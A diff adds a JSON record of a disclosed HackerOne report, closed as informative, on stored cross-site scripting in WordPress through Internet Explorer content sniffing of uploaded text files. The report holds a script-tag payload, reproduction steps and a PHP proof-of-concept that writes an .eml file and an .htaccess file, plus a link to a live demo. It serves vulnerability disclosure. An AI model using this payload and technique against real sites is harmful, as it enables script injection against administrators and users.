@@ -1,0 +1,123 @@
+{
+  "id": 276105,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNzYxMDU=",
+  "url": "https://hackerone.com/reports/276105",
+  "title": "Stored XSS in WordPress",
+  "state": "Closed",
+  "substate": "informative",
+  "severity_rating": "medium",
+  "readable_substate": "Informative",
+  "created_at": "2017-10-10T13:09:11.299Z",
+  "submitted_at": "2017-10-10T13:09:11.299Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "abdullah",
+    "url": "/abdullah",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/517/21c2a953ee413aae42d17e5560638244a876072c_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 55,
+    "url": "https://hackerone.com/wordpress",
+    "handle": "wordpress",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "WordPress",
+      "twitter_handle": "wordpress",
+      "website": "https://wordpress.org/",
+      "about": "Beautiful sites of any kind."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2018-02-02T18:58:35.379Z",
+  "bug_reporter_agreed_on_going_public_at": "2018-02-02T17:53:58.675Z",
+  "team_member_agreed_on_going_public_at": "2018-02-02T18:58:35.324Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hi, \n\nIntroduction  \n---------------\n\nThe upload mechanism in WordPress works by the role of the user who's trying to upload something. So every role has a permission to upload certain files. For the lowest role like **author** can upload harmless file such as **txt**, png, gif, jpg, zip, with this file the author role can't attack any other user with these files. \n\nOne thing is that **txt** file is harmful! there is a way to make the files that it's `content-type` is `text/plain` to be served as `text/html` in IE all versions! \nSo author can upload a txt file and attack the admin and other users with XSS exploit can be so much harmful due the admin can write php code like this #263718. \n\n  \nTechnical Details \n--------------------\nIE running a content sniffing on unknown content-type and if the page that is being sniffed has an iframe to another page the sniffing will run on the framed page as well so, if the page contain html content the iframe content will be showed as HTML even if it's a text file! And `X-Content-Type-Options` is useless even if you set it's value to `nosniff` it will be sniffed by IE anyway. \n\nThis finding belong to Jan (https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/)\n\n\nSteps to reproduce\n-----------\n\n1- Sing in using author account.\n2- Go to http://127.0.0.1/wordpress/wp-admin/upload.php.\n3- Upload a text file like this one **test.txt** contains the following code : \n`<html><script>alert(document.domain)</script></html>`.\n4- Get the file URL ex : http://127.0.0.1/wordpress/wp-content/uploads/2017/10/test.txt.\n5- Create eml file using SSH. follow the [article](https://jankopecky.net/index.php/2017/04/18/0day-textplain-considered-harmful/) steps or you can use this php script that I made. \n\n`poc.php?url={URL of the Text file in wordpress path}`\n\n```\n<?php\n$url = urlencode($_GET['url']);\n$url = str_replace('%','=',$url);\n$eml_content = \n\"TESTME\nContent-Type: text/html\nContent-Transfer-Encoding: quoted-printable\n\n=3Chtml=3E=3Ch1=3EWordPress=3C=2Fhtml=3E\n=3Ciframe=20src=3D=27$url=27=3E=3C=2Fiframe=3E=0A\n\n\";\n$htaccess_content = \"AddType message/rfc822 .eml\nHeader add Content-Transfer-Encoding \\\"quoted-printable\\\"\";\n$eml_file = file_put_contents(\"test.eml\", $eml_content, FILE_APPEND | LOCK_EX );\n$htaccess_file = file_put_contents(\".htaccess\", $htaccess_content, FILE_APPEND | LOCK_EX );\n//echo $eml_content;\n?>\n```\n\n6- After you create `test.eml` and `.htaccess` go to test.eml in **any** Windows and any IE version and you will see an alert of WordPress host! \n\nLive PoC \n-----------------------\nJust create a file at this path `http://127.0.0.1/wordpress/wp-content/uploads/2017/10/test.txt` with the following code :\n`<html><script>alert(document.domain)</script></html>`\nAnd access this page using IE \nhttp://playground.ahussam.me/test.eml\n \n\nScreenshots \n----------------------------\n{F227941}\n\n{F227943}\n\nTest Environment \n-------------------------\nWindows 10, IE 11; Windows 8.1, IE 11; Windows 8 IE 10. \n\n  \n   \nIf you have any question I will be happy to answer it. \n\nI am waiting your reply. \n\nThanks for reading ",
+  "weakness": {
+    "id": 62,
+    "name": "Cross-site Scripting (XSS) - Stored"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 227941,
+      "file_name": "wp1.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/227/941/9060fd14e07b4caf3509fec52ead104ace7bed05/wp1.png?response-content-disposition=attachment%3B%20filename%3D%22wp1.png%22%3B%20filename%2A%3DUTF-8%27%27wp1.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5A3QBGAF%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125159Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDOmRjyw5I%2FTlNnXkSaQt0HWBvcx4KUqlbsBDywYvgMjAIgc1T3omLkZfSHGnxG7u3M%2BDm3ZU5hXXACm6d42GSb7EAqsQUIdhADGgwwMTM2MTkyNzQ4NDkiDI1cp4QslnXVHIUCaCqOBecH%2BJNC0KwQ%2BfCYMGM86f%2FOS1Dm%2BIA%2BHjSlOORnFjZmELOvSSorEYFhUaPaxwQcFsTE7OMurOw%2BQnTNbwJzmGH%2FjDpGT%2FxwOi1Yf0v9t5xHdyje9QeqWvWnPlxRuLTKdeHLfuYjPaGYHjDPk%2ByYZLTVi%2F6fLFk1LMc7Dx726KzEvXPKCa4bME8qI31URj4F9nDQiBGwytvr7Hm1EMgKGmVAK6%2Fbzd%2BJiZVqxHd3sYJSTbmtS%2BAl2zqAc8BSfBosM0X88oi3lBTlSqMNhfG3CaAXBePpXwzrVOqz74NfDYXdsP4VQdYegntsv6fFEZFiKkjhlglh0X4pAXPbvFNkY8C7BzpUD2tNRzacCXSlRaco9RM5vUg086o63M3dgo9tb8DkSAwOHamrNu%2F2KO2aggnlYsi1aZ7EJQTnQ4h%2BcjkM2D28%2Bxcxlpa3Ec2gB5yd%2BQcUjU%2BzbbmFbStd4UJXYiE38Skp99somT%2BpCEikiE7WFVYA5Pgb9J6BqOzjaorE7DzLysbe4e0jMnv06eVq4H%2Bz42eH%2FkluYPtzip94lWrairjO%2BPy%2BVDKDVJai6d1iVpfcEFmbncPaNpU53sKrhSNhpvIUbUDu5YaFK6X%2FbL%2BeFksXVgGaf0JwUeSzAh%2FGbxLEuo6xDzuhAOmMHndLW%2FF8uphSoqM7NkjvQNWF4znkPMyfsDxu0sKfOHhED1nQ5geErhYuMeCPDWNlWvJKC2X93i%2B8i8WntV0NtA21WXhLXSnrHVz2HCPlDghBMIvH7mgPpfyFhSMGQDeGjpSbj3uInocAFuDTAgJeZIwRGGMYeOXoRMIVrM6FWdeiP%2FaI3a0LUECdOBOPVvRMLQuf7VJvF0078t1crT4PlcQMPTC%2Fwq2uBjqxAVnkBdxFUTWQ4ZupRlHVu9PZr1k7xqw4QHDS7pllKyJWE05aIrKtcQLI8f74A6IlC2qLL0KpjvsW622557lHAqxIiBIxR28dhgaLkoywMH6F6KWd%2BowMbbVNahcgFgF8sWKuHHJPaj4kiHcEz7czNhJgm88FkmgTRhhw7HW2Z01FS2x%2BrnGRx5%2BvOZPEvDu%2BIRvDNGu%2FVrwK5wtu%2BRwxD8V7oEVMXOuAFSFlduj5GO6kbQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=54583d24a6e135c4e2559fa31e34b0fd6628dcf2ab71f9de3771d12ef22945b1",
+      "file_size": 51496,
+      "type": "image/png",
+      "moderated": null
+    },
+    {
+      "id": 227943,
+      "file_name": "wp2.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/227/943/6e92617ee30361a4f3f33a012ffc06f1510cf830/wp2.png?response-content-disposition=attachment%3B%20filename%3D%22wp2.png%22%3B%20filename%2A%3DUTF-8%27%27wp2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ5A3QBGAF%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T125159Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDOmRjyw5I%2FTlNnXkSaQt0HWBvcx4KUqlbsBDywYvgMjAIgc1T3omLkZfSHGnxG7u3M%2BDm3ZU5hXXACm6d42GSb7EAqsQUIdhADGgwwMTM2MTkyNzQ4NDkiDI1cp4QslnXVHIUCaCqOBecH%2BJNC0KwQ%2BfCYMGM86f%2FOS1Dm%2BIA%2BHjSlOORnFjZmELOvSSorEYFhUaPaxwQcFsTE7OMurOw%2BQnTNbwJzmGH%2FjDpGT%2FxwOi1Yf0v9t5xHdyje9QeqWvWnPlxRuLTKdeHLfuYjPaGYHjDPk%2ByYZLTVi%2F6fLFk1LMc7Dx726KzEvXPKCa4bME8qI31URj4F9nDQiBGwytvr7Hm1EMgKGmVAK6%2Fbzd%2BJiZVqxHd3sYJSTbmtS%2BAl2zqAc8BSfBosM0X88oi3lBTlSqMNhfG3CaAXBePpXwzrVOqz74NfDYXdsP4VQdYegntsv6fFEZFiKkjhlglh0X4pAXPbvFNkY8C7BzpUD2tNRzacCXSlRaco9RM5vUg086o63M3dgo9tb8DkSAwOHamrNu%2F2KO2aggnlYsi1aZ7EJQTnQ4h%2BcjkM2D28%2Bxcxlpa3Ec2gB5yd%2BQcUjU%2BzbbmFbStd4UJXYiE38Skp99somT%2BpCEikiE7WFVYA5Pgb9J6BqOzjaorE7DzLysbe4e0jMnv06eVq4H%2Bz42eH%2FkluYPtzip94lWrairjO%2BPy%2BVDKDVJai6d1iVpfcEFmbncPaNpU53sKrhSNhpvIUbUDu5YaFK6X%2FbL%2BeFksXVgGaf0JwUeSzAh%2FGbxLEuo6xDzuhAOmMHndLW%2FF8uphSoqM7NkjvQNWF4znkPMyfsDxu0sKfOHhED1nQ5geErhYuMeCPDWNlWvJKC2X93i%2B8i8WntV0NtA21WXhLXSnrHVz2HCPlDghBMIvH7mgPpfyFhSMGQDeGjpSbj3uInocAFuDTAgJeZIwRGGMYeOXoRMIVrM6FWdeiP%2FaI3a0LUECdOBOPVvRMLQuf7VJvF0078t1crT4PlcQMPTC%2Fwq2uBjqxAVnkBdxFUTWQ4ZupRlHVu9PZr1k7xqw4QHDS7pllKyJWE05aIrKtcQLI8f74A6IlC2qLL0KpjvsW622557lHAqxIiBIxR28dhgaLkoywMH6F6KWd%2BowMbbVNahcgFgF8sWKuHHJPaj4kiHcEz7czNhJgm88FkmgTRhhw7HW2Z01FS2x%2BrnGRx5%2BvOZPEvDu%2BIRvDNGu%2FVrwK5wtu%2BRwxD8V7oEVMXOuAFSFlduj5GO6kbQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=64c1a076dbf7776bd1ce418ae4b4d355a94a6c4caeee460e1bda1847ce347c40",
+      "file_size": 62401,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 3,
+  "voters": [
+    "exception",
+    "spetr0x",
+    "funwithme"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
